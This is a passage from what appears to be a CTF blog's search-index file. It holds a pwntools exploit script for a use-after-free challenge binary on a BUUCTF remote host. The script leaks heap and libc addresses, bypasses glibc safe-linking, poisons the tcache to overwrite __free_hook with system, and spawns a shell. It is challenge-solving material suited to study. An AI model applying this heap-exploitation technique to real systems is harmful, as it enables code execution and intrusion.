class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">local_file  = <span class="string">&#x27;./uaf&#x27;</span></span><br><span class="line">local_libc  = <span class="string">&#x27;./libc-2.33.so&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">e = ELF(local_file)</span><br><span class="line">context.arch = e.arch</span><br><span class="line"></span><br><span class="line">select = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">0</span>:</span><br><span class="line">    r = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29477</span>)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.slafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims    :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(ru(data)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(ru(data)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">info_base = <span class="keyword">lambda</span> tag, base        :r.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(base))</span><br><span class="line">leak = <span class="keyword">lambda</span> name,base :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, base))</span><br><span class="line">gadget = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">r.timeout = <span class="number">0.5</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">cmd</span>):</span><br><span class="line">    gdb.attach(r,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,desc</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Please tell me its size:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    se(desc)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,desc</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Please tell me the index:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    ru(<span class="string">b&#x27;Please tell me its content:&#x27;</span>)</span><br><span class="line">    se(desc)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Please tell me the index:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Please tell me the index:&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        add(<span class="number">0x80</span>,<span class="string">b&#x27;/bin/sh\x00\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    he0=uu64(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(he0))</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    he1=u64(ru(<span class="string">b&#x27;\x00&#x27;</span>)[-<span class="number">7</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(he1))</span><br><span class="line">    heap=he0^he1</span><br><span class="line">    leak(<span class="string">&quot;heap&quot;</span>,heap)</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">8</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    he=u64(ru(<span class="string">b&#x27;\x00&#x27;</span>)[-<span class="number">7</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(he))</span><br><span class="line">    show(<span class="number">6</span>)</span><br><span class="line">    he6=u64(ru(<span class="string">b&#x27;\x00&#x27;</span>)[-<span class="number">7</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(he6))</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    base=uu64(<span class="string">b&#x27;\x7f&#x27;</span>)-<span class="number">0x1e0c00</span></span><br><span class="line">    leak(<span class="string">&quot;base&quot;</span>,base)</span><br><span class="line">    free_hook=base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">    sys=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    leak(<span class="string">&quot;sys&quot;</span>,sys)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">128</span>,<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">    tagerheap=heap+<span class="number">0x2d0</span></span><br><span class="line">    leak(<span class="string">&quot;target heap:&quot;</span>,tagerheap)</span><br><span class="line">    tagerheap_key=tagerheap^he</span><br><span class="line">    leak(<span class="string">&quot;target heap_key:&quot;</span>,tagerheap_key)</span><br><span class="line">    libc_key=tagerheap_key+<span class="number">0x170</span></span><br><span class="line">    leak(<span class="string">&quot;target libc_key:&quot;</span>,libc_key)</span><br><span class="line">    fd = free_hook^libc_key</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">6</span>)</span><br><span class="line">    edit(<span class="number">9</span>,p64(fd)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">    add(<span class="number">128</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">128</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    edit(<span class="number">11</span>,p64(sys)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    dele(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
